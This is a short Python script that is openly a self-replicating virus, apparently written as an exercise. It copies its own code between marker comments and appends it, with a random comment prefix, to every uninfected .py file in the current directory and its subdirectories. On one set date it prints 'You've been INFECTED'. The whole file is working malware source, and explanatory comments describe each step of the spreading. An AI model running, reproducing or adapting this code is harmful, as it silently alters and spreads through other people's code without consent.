
#ThisFileIsInfected
import os
import random
import string
from pathlib import Path
import datetime

infectFile = False 
path1 = Path().absolute()
malwareCode = []

##generates random comment  for files 
def randomCommentGenerator():
	return ''.join(random.SystemRandom().choice(string.ascii_uppercase +string.ascii_lowercase +string.digits) for i in range(random.randint(30,40)))

##copies the malware code (mwc) to a list called malwareCode
## to copy the malware code lines we need to open the current file we are in for read.
## to know where to start copy and when to end we have flag called infectFile which identify by the lines in comment 
## #ThisFileIsInfected and #DoneInfection

with open(os.path.basename(__file__),'r') as mwc:
	for line in mwc:
		if line.endswith("#ThisFileIsInfected" + '\n'):
			infectFile = True
		if line.startswith("#DoneInfection"):
			infectFile = False
		if (infectFile):
			malwareCode.append(line)
malwareCode.append("#DoneInfection")

## finds all files in directory and sub directories which ends with .py
## open each file for "read" and checks if the line "#ThisFileIsInfected" which represent the start of the copy is not existing in the current file
## if the line doest exists - open the file to "write" and generate a randomComment using out function from earlier and copy the malware code to the end of the file
for root, dirs, files in os.walk(path1):
	for file in files:
		if file.endswith(".py"):
			with open(os.path.join(root, file)) as x: 
				if "#ThisFileIsInfected" not in x.read():
					with open(os.path.join(root, file), 'a') as ifc:
						randomComment = randomCommentGenerator()
						ifc.write('#' + randomComment + '\n')
						for line in malwareCode:
							ifc.write(line)
##checks if todays date is: 7/12/2020, if so, print the message
if (datetime.date(2020,12,7) == datetime.date.today()):
	print("You've been INFECTED")
#DoneInfection
